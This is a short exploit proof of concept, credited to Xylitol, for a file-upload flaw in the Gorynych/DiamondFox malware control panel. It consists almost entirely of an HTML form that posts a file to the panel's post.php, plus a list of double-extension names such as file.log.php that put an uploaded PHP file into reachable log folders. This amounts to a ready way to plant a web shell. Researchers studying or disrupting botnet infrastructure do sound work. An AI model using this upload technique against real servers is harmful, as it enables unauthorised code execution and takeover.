#### Gorynych/DiamondFox v4.2.0.257


Type: File Upload Vulnerability

Author: [Xylitol](https://twitter.com/Xylit0l)

```
<!DOCTYPE html>
<html>
	<head>
		<title>Gorynych v4.2.0.257- File Upload Vulnerability</title>
		<!-- Panel.zip hash: e698cf7cc57b20c02fce6de83299b75b -->
	</head>
	<body>
		<h1>&#9673; Gorynych/DiamondFox v4.2.0.257 - File Upload Vulnerability &#9673;</h1>
		<form action="http://localhost/Panel/post.php" method="POST" enctype="multipart/form-data">
			<input type="file" name="upload1">
			<input type="hidden" name="slots" value="1">
			<input type="submit" value="PWN!"">
		</form>
File naming convention:<br>
&#9733; file.log.php (go to logs/dump/file.log.php)<br>
&#9733; file.jpg.php (go to logs/scr/file.jpg.php)<br>
&#9733; file.LOG.php (go to logs/pass/file.LOG.php)<br>
&#9733; file.txt.php (go to logs/ftp/file.txt.php)<br>
&#9733; file.TXT.php (go to logs/rdp/file.TXT.php)<br>
&#9733; file.TxT.php (go to logs/mail/file.TxT.php)<br>
&#9733; file.html.php (go to logs/kyl/file.html.php)<br>
&#9733; file.wallet.php (go to logs/wallet/file.wallet.php)
	</body>
</html>
```
